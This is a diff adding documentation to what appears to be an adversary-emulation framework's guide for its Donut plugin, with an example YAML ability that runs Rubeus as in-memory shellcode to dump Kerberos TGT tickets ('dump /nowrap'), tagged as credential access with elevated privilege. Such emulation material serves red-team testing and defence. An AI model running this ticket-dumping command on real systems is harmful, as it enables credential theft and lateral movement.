@@ -372,3 +372,24 @@ The following example shows donut functionality using the optional `command` fie
               }
           }
 ```
+
+Donut can also be used to read from an already-compiled executable with a `.donut.exe` extension. The following example will transform a payload named `Rubeus.donut.exe` into shellcode which will be executed in memory. Note that `Rubeus.donut` is specified:
+
+```yaml
+---
+
+- id: 043d6200-0541-41ee-bc7f-bcc6ba15facd
+  name: TGT Dump
+  description: Dump TGT tickets with Rubeus
+  tactic: credential-access
+  technique:
+    attack_id: T1558
+    name: Steal or Forge Kerberos Tickets
+  privilege: Elevated
+  platforms:
+    windows:
+      donut_amd64:
+        command: .\Rubeus.donut dump /nowrap
+        payloads:
+        - Rubeus.donut
+```
